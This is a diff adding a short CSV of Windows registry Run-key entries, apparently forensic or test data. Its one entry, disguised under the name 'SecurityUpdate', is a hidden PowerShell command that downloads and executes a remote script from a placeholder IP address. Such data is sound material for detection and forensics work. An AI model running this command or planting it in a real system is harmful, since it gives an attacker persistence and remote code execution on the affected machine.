@@ -1,0 +1,2 @@
+KeyPath,ValueName,ValueData,LastWriteTimeUTC
+Software\Microsoft\Windows\CurrentVersion\Run,SecurityUpdate,"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/s')",2026-03-15 14:25:30
